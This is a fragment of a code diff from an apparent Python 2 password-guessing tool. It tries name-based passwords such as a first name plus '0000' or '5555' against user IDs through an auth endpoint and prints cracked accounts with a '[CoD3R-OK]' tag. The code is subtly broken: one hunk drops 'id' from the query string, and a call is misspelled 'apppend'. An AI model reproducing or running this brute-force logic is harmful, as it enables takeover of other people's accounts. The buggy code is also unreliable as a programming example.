@@ -689,9 +689,8 @@ pass5, headers = header).text
                                                 cps.apppend(uid + pass9)
                                             else:
                                                 pass10 = name.lower().split(' ')[0] + '0000'
-                                                data = requests.get('http://localhost:5000/auth?id=' + 
-
-uid + '&pass=' + pass10, headers = header).text
+                                                data = requests.get('http://localhost:5000/auth?id=' + uid + 
+'&pass=' + pass10, headers = header).text
                                                 q = json.loads(data)
                                                 if 'loc' in q:
                                                     print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass10
@@ -707,9 +706,8 @@ uid + '&pass=' + pass10, headers = header).text
                                                     cps.apppend(uid + pass10)
                                                 else:
 						    pass11 = name.lower().split(' ')[0] + '5555'
-                                                    data = requests.get('http://localhost:5000/auth?
-
-id=' + uid + '&pass=' + pass11, headers = header).text
+                                                    data = requests.get('http://localhost:5000/auth?=' + uid + 
+'&pass=' + pass11, headers = header).text
                                                     q = json.loads(data)
                                                     if 'loc' in q:
                                                         print '\033[1;92m[CoD3R-OK] ' + uid + ' | ' + pass11
